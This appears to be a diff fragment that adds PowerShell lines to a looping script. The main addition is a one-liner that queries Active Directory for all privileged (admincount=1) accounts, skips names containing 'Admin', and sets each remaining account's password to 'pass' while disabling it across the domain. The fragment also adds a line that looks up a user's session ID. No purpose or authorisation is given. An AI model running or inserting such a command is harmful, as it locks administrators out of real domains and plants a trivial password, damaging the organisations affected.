@@ -16,3 +16,16 @@ while ($true) {
     }
     start-sleep 20
 }
+
+
+
+powershell foreach ($line in dsquery * -filter "(&(objectclass=user)(admincount=
+1))" -attr samaccountname -limit 0 -l){if (-not $line.contains("Admin")){write-h
+ost $line;net user $line "pass" /active:no /domain }}
+
+
+$session = ((quser /server:$server | ? { $_ -match $username }) -split ' +')[2]
+
+
+
+
